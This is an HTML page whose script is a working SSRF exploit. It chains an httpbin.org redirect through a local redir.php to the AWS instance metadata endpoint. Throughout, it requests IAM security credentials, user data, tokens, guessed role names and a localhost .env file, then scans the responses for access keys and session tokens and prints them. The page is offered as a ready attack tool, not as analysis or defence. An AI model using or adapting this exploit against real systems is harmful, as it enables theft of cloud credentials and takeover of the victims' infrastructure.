<!DOCTYPE html>
<html>
<head>
    <title>Double Redirect AWS Attack</title>
</head>
<body>
    <h1>ğŸ”— Double Redirect AWS Metadata Attack</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Use the confirmed working chain: httpbin.org â†’ 127.0.0.1/redir.php â†’ AWS metadata
        var doubleRedirectTests = [
            // Chain 1: httpbin.org â†’ localhost redir â†’ AWS metadata root
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/',
            
            // Chain 2: httpbin.org â†’ localhost redir â†’ AWS IAM credentials
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            
            // Chain 3: httpbin.org â†’ localhost redir â†’ AWS v1 metadata (might not need token)
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
            
            // Chain 4: Try older AWS API versions via double redirect
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2008-02-01/meta-data/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2009-04-04/meta-data/',
            
            // Chain 5: Try AWS user data via double redirect
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/user-data/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data/',
            
            // Chain 6: Test if we can get AWS token via double redirect 
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/api/token',
            
            // Chain 7: Try direct role access (if we know role name)
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/DefaultRole',
            
            // Chain 8: Test other internal services via double redirect
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/secret/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/.env',
            
            // Chain 9: Try to confirm the redirector works with simple test
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://httpbin.org/get',
        ];
        
        for(var i = 0; i < doubleRedirectTests.length; i++) {
            try {
                results += "<h3>ğŸ”— Chain " + (i+1) + ": " + doubleRedirectTests[i].split('127.0.0.1/redir.php?url=')[1] + "</h3>";
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(doubleRedirectTests[i]), false);
                xhr.send();
                
                if(xhr.responseText && xhr.responseText.trim().length > 5) {
                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>ğŸ¯ SUCCESS: " + xhr.responseText.length + " bytes</div>";
                    
                    // Look for AWS credentials
                    var text = xhr.responseText.toLowerCase();
                    if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
                        results += "<div style='background:#ff0000;color:white;padding:15px;border:3px solid red;'>ğŸš¨ğŸš¨ğŸš¨ AWS CREDENTIALS EXTRACTED! ğŸš¨ğŸš¨ğŸš¨</div>";
                    }
                    if(text.includes('asia') && text.includes('secret') && text.includes('token')) {
                        results += "<div style='background:#ff4500;color:white;padding:12px;border:3px solid orange;'>ğŸ”‘ FULL AWS CREDENTIAL SET FOUND! ğŸ”‘</div>";
                    }
                    if(text.includes('s3role') || text.includes('ec2role') || text.includes('iam')) {
                        results += "<div style='background:#ffa500;color:white;padding:8px;'>ğŸ¯ IAM ROLE DETECTED!</div>";
                    }
                    if(text.includes('ami-') || text.includes('instance-') || text.includes('placement')) {
                        results += "<div style='background:#74c0fc;padding:8px;'>â˜ï¸ AWS METADATA CONTENT!</div>";
                    }
                    if(text.includes('401') || text.includes('unauthorized')) {
                        results += "<div style='background:#ffeaa7;padding:8px;'>âš ï¸ Still getting 401 (need different approach)</div>";
                    }
                    
                    results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:3px;'>âŒ No response</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:3px;'>âŒ " + e.message.substring(0, 50) + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
